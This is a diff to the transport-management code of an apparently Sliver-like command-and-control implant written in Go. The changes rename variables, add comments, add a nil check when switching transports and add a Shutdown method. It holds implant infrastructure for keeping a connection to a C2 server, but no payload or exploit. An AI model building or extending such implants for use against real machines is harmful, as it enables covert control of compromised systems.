@@ -24,6 +24,7 @@ import (
 	// {{end}}
 
 	"errors"
+	"fmt"
 	"sync"
 	"time"
 
@@ -42,10 +43,10 @@ var (
 // c2s - Holds all active c2s for this implant.
 // This is consumed by some handlers & listeners, as well as the routing system.
 type c2s struct {
-	Available []*C2 // All transports available (compiled in) to this implant
-	Server    *C2   // The transport tied to the C2 server (active connection)
-	mutex     *sync.RWMutex
-	waiter    *sync.WaitGroup
+	Available []*C2           // All transports available (compiled in) to this implant
+	Server    *C2             // The transport tied to the C2 server (active connection)
+	mutex     *sync.RWMutex   // Concurrency
+	waiter    *sync.WaitGroup // Block so that the implant never exits without warning.
 }
 
 // Init - Parses all available transport strings and registers them as available transports.
@@ -77,30 +78,31 @@ func (t *c2s) Init() (err error) {
 	// {{end}}
 
 	// Then start the first C2 transport, with fallback if failure
-	for _, c2 := range t.Available {
+	for _, transport := range t.Available {
 
 		// This might will init the Comm system, but in the case of tunnel-based
 		// routing, we have concurrently started this process, and it will only
 		// finish its setup once we are out of this Init() function.
-		err = c2.Start()
+		err = transport.Start()
 
 		if err != nil {
 			// {{if .Config.Debug}}
-			log.Printf("Failed to start C2 Channel %s: %s", c2.Profile.ID, err)
+			log.Printf("Failed to start C2 Channel %s: %s", transport.Profile.ID, err)
 			// {{end}}
 
 			// Wait if this transport failed.
-			time.Sleep(time.Duration(c2.Profile.Interval))
+			time.Sleep(time.Duration(transport.Profile.Interval))
 			continue
 		}
 
 		// Else success: set transport as active C2,
 		t.mutex.RLock()
-		Transports.Server = c2
+		Transports.Server = transport
 		t.mutex.RUnlock()
 
-		// Send the registration message, and break the loop as we successfully connected
-		c2.Register()
+		// Send the registration message, and break
+		// the loop as we successfully connected
+		transport.Register()
 		break
 	}
 
@@ -161,6 +163,14 @@ func (t *c2s) Get(ID string) (c2 *C2) {
 func (t *c2s) Switch(ID string) (err error) {
 
 	var next = Transports.Get(ID)
+	if next == nil {
+		return fmt.Errorf("could not find transport with ID %s", ID)
+	}
+
+	// {{if .Config.Debug}}
+	log.Printf("Switching the current transport: %s", t.Server.ID)
+	log.Printf("New transport: %s", next.ID)
+	// {{end}}
 
 	// {{if .Config.CommEnabled}}
 
@@ -201,4 +211,25 @@ func (t *c2s) Switch(ID string) (err error) {
 	next.RegisterTransportSwitch(oldTransportID)
 
 	return nil
+}
+
+// Shutdown - Close all availables transports. If the exit parameter is true
+// the transports will close their waiter, which will release the main function
+// of this implant program. Normally, this is set true when the kill command
+// is received, but not for the "disconnect" command (because we just sleep for this one)
+func (t *c2s) Shutdown() (err error) {
+
+	// Close the server transport
+	err = t.Server.Stop()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf(err.Error())
+		// {{end}}
+	}
+
+	// Release lock on the implant main if asked to
+	// if exit {
+	//         t.waiter.Done()
+	// }
+	return
 }
